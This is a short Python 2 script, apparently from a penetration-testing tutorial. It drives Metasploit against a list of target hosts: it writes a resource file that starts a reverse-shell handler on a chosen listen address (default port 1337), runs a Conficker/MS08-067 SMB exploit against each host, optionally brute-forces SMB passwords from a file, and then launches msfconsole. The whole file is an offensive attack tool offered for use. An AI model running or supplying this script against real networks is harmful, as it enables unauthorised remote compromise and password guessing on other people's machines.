__author__ = 'derog'

import os
import optparse
import MetasploitInteract
import RemoteSMBBruteForce

def main():
    configFile=open('meta.rc','w')
    parser = optparse.OptionParser('usage %prog -H' + '<RHOST[s]> -l <LHOST> [-p <LPORT> -F <Password File>]')
    parser.add_option('-H', dest='tgtHost', type="string", help="specify target address[ess]")
    parser.add_option('-p', dest='lport', type="string", help="specify the listen port")
    parser.add_option('-l', dest='lhost', type="string", help="specify the listen adress")
    parser.add_option('-F', dest='passwdFile', type="string", help="password file for SMB brute force attempt")
    (options, args) = parser.parse_args()
    if (options.tgtHost==None) or (options.lhost==None):
        print parser.usage
        exit(0)
    lhost = options.lhost
    lport = options.lport
    if lport == None:
        lport = '1337'
    passwdFile = options.passwdFile
    tgtHosts = MetasploitInteract.findTgts(options.tgtHost)
    MetasploitInteract.setupHandler(configFile,lhost,lport)
    for tgtHost in tgtHosts:
        MetasploitInteract.confickerExploit(configFile,tgtHost,lhost,lport)
        if passwdFile!=None:
            RemoteSMBBruteForce.smbBrute(configFile,tgtHost,passwdFile,lhost,lport)
    configFile.close()
    os.system('msfconsole -r meta.rc')

if __name__ == '__main__':
    main()
